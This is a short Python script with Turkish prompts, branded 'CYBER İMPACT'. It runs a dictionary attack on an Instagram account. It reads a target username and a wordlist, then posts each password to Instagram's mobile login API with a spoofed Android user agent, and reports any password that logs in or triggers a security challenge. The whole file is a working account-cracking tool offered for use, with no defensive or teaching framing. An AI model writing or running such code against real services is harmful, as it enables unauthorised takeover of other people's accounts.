import requests
from uuid import uuid4
uid = str(uuid4())
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' 
username=input(Z+'[♡] Kullanıcı adı giriniz ==> ')
passlist=input(S+'[◇] Wordlist giriniz ==> ')
print('======CYBER İMPACT=========')
for Whisper in open(passlist,'r').read().splitlines():
 password=str(Whisper.split('\n')[0])
 url = 'https://b.i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
 data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
 whisper=requests.post(url,headers=headers,data=data)
 if 'logged_in_user' in whisper.json():
  print(f"{G}[✅] {username}'s PassWord Is ==> {password}")
 if '"message":"challenge_required"' in whisper.text:
  print(f"{S}[✅] {username}'s PassWord Is ==> {password} But it's Secure")
 else:
  print(f'{E}[×] Wrong ==> | {username} | {password}')
